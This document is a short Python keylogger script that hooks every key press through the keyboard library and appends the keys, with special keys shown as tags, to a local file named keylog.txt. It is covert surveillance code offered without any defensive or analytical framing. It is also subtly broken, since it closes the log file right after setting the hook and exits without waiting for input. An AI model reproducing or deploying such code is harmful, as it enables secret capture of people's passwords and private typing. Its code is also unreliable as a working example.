import keyboard

def keylogger():
    log_file = open("keylog.txt", "a")

    def on_key_press(event):
        key = event.name
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            elif key == "backspace":
                key = "[BACKSPACE]"
            else:
                key = f"[{key.upper()}]"
        log_file.write(key)

    keyboard.on_press(on_key_press)

    log_file.close()

if __name__ == "__main__":
    keylogger()
